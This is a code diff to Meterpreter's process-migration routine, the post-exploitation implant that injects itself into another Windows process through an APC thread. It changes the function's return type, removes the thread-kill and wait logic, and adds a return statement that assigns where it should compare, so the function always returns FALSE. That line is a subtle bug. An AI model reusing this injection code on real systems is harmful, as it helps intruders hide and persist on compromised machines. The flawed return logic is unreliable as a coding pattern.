@@ -65,7 +65,7 @@ typedef struct _MIGRATECONTEXT
 /*
  * Migrate the meterpreter server from the current process into another process.
  */
-DWORD remote_request_core_migrate( Remote * remote, Packet * packet )
+BOOL remote_request_core_migrate( Remote * remote, Packet * packet, DWORD* pResult )
 {
 	DWORD dwResult            = ERROR_SUCCESS;
 	Packet * response         = NULL;
@@ -185,26 +185,12 @@ DWORD remote_request_core_migrate( Remote * remote, Packet * packet )
 			if( inject_via_apcthread( remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, ((BYTE*)lpMemory+dwMigrateStubLength) ) != ERROR_SUCCESS )
 				BREAK_ON_ERROR( "[MIGRATE] inject_via_apcthread failed" )
 		}
-/*
-		// Wait at most 15 seconds for the event to be set letting us know that it's finished
-		if( WaitForSingleObjectEx( hEvent, 15000, FALSE ) != WAIT_OBJECT_0 )
-			BREAK_ON_ERROR( "[MIGRATE] WaitForSingleObjectEx failed" )
 
-		// Signal the main server thread to begin the shutdown as migration has been successfull.
-		dprintf("[MIGRATE] Shutting down the Meterpreter thread 1 (signaling main thread)...");
-		thread_sigterm( serverThread );
-*/
 
-		// Signal the main server thread to begin the shutdown as migration has been successfull.
-		// If the thread is not killed, the pending packet_receive prevents the new process
-		// from being able to negotiate SSL.
-		dprintf("[MIGRATE] Shutting down the Meterpreter thread 1 (killing the main thread)...");
-		thread_kill( serverThread );
-
-		// Wait at most 15 seconds for the event to be set letting us know that it's finished
-		// Unfortunately, its too late to do anything about a failure at this point
-		if( WaitForSingleObjectEx( hEvent, 15000, FALSE ) != WAIT_OBJECT_0 )
-			dprintf("[MIGRATE] WaitForSingleObjectEx failed with no way to recover");
+		//// Wait at most 15 seconds for the event to be set letting us know that it's finished
+		//// Unfortunately, its too late to do anything about a failure at this point
+		//if( WaitForSingleObjectEx( hEvent, 15000, FALSE ) != WAIT_OBJECT_0 )
+		//	dprintf("[MIGRATE] WaitForSingleObjectEx failed with no way to recover");
 
 		dwResult = ERROR_SUCCESS;
 
@@ -221,7 +207,10 @@ DWORD remote_request_core_migrate( Remote * remote, Packet * packet )
 	if( hEvent )
 		CloseHandle( hEvent );
 
-	return dwResult;
+	if( pResult )
+		*pResult = dwResult;
+
+	return dwResult = ERROR_SUCCESS ? TRUE : FALSE;
 }
 
 
